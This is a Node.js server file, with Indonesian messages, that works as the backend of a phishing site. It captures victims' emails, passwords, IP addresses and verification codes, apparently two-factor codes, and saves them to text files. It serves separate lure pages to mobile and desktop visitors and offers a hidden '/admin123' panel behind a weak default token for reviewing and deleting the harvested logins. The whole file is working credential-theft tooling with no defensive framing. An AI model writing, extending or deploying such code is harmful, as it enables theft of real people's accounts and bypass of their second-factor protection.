const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 3000;
const SAVE_DIR = path.join(__dirname, '_saved_logins');
const MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.json': 'application/json',
    '.png': 'image/png',
    '.webp': 'image/webp',
    '.ico': 'image/x-icon',
};

const server = http.createServer((req, res) => {
    const parsed = url.parse(req.url, true);
    const pathname = parsed.pathname;

    if (req.method === 'POST' && pathname === '/api/save-login') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password } = data;
                if (!email || !password) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'email dan password wajib diisi' }));
                    return;
                }
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
                if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
                const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
                const filePath = path.join(SAVE_DIR, safeName);
                const content = `Email/Username: ${email}\nPassword: ${password}\nIP: ${ip}\nTersimpan: ${new Date().toISOString()}\n`;
                fs.writeFileSync(filePath, content, 'utf-8');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, file: safeName }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    if (req.method === 'POST' && pathname === '/api/save-code') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, code } = data;
                if (!email || !code) {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'email dan code wajib diisi' }));
                    return;
                }
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
                if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
                const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
                const filePath = path.join(SAVE_DIR, safeName);
                let existing = '';
                if (fs.existsSync(filePath)) {
                    existing = fs.readFileSync(filePath, 'utf-8');
                    if (!existing.includes('IP:')) {
                        existing = existing.replace('Password: ', 'IP: \nPassword: ');
                    }
                }
                const content = `${existing}Kode Verifikasi: ${code}\nIP: ${ip}\nTersimpan: ${new Date().toISOString()}\n`;
                fs.writeFileSync(filePath, content, 'utf-8');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, file: safeName }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    if (req.method === 'GET' && pathname === '/api/get-logins') {
        const token = parsed.query.token || '';
        const secret = process.env.PANEL_TOKEN || '2026';
        if (token !== secret) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        const files = fs.existsSync(SAVE_DIR) ? fs.readdirSync(SAVE_DIR) : [];
        const data = files.map(f => {
            const content = fs.readFileSync(path.join(SAVE_DIR, f), 'utf-8');
            const lines = content.split('\n');
            const email = (lines.find(l => l.startsWith('Email/Username:')) || '').replace('Email/Username: ', '');
            const password = (lines.find(l => l.startsWith('Password:')) || '').replace('Password: ', '');
            const code = (lines.find(l => l.startsWith('Kode Verifikasi:')) || '').replace('Kode Verifikasi: ', '') || null;
            const ip_address = (lines.find(l => l.startsWith('IP:')) || '').replace('IP: ', '') || null;
            const created_at = (lines.find(l => l.startsWith('Tersimpan:')) || '').replace('Tersimpan: ', '');
            return { id: files.indexOf(f) + 1, email, password, code, ip_address, created_at };
        }).reverse();
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ data }));
        return;
    }

    if (req.method === 'POST' && pathname === '/api/delete-login') {
        const token = parsed.query.token || '';
        const secret = process.env.PANEL_TOKEN || '2026';
        if (token !== secret) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Unauthorized' }));
            return;
        }
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { id } = JSON.parse(body);
                const files = fs.existsSync(SAVE_DIR) ? fs.readdirSync(SAVE_DIR) : [];
                const idx = parseInt(id) - 1;
                if (idx >= 0 && idx < files.length) {
                    fs.unlinkSync(path.join(SAVE_DIR, files[idx]));
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true }));
            } catch (e) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    if (pathname === '/admin123') {
        filePath = path.join(__dirname, 'panel.html');
        const ext = '.html';
        res.writeHead(200, { 'Content-Type': MIME[ext] || 'text/html; charset=utf-8' });
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('404 Not Found');
                return;
            }
            res.end(data);
        });
        return;
    }

    let filePath;
    if (pathname === '/') {
        const ua = (req.headers['user-agent'] || '').toLowerCase();
        const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
        filePath = path.join(__dirname, isMobile ? 'indexm.html' : 'index.html');
    } else {
        filePath = path.join(__dirname, pathname);
    }
    const ext = path.extname(filePath);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            const notFound = path.join(__dirname, '404.html');
            fs.readFile(notFound, (err2, data2) => {
                if (err2) {
                    res.writeHead(404, { 'Content-Type': 'text/plain' });
                    res.end('404 Not Found');
                    return;
                }
                res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end(data2);
            });
            return;
        }
        res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
        res.end(data);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server jalan di http://localhost:${PORT}`);
    console.log(`Data login tersimpan ke: ${SAVE_DIR}`);
});
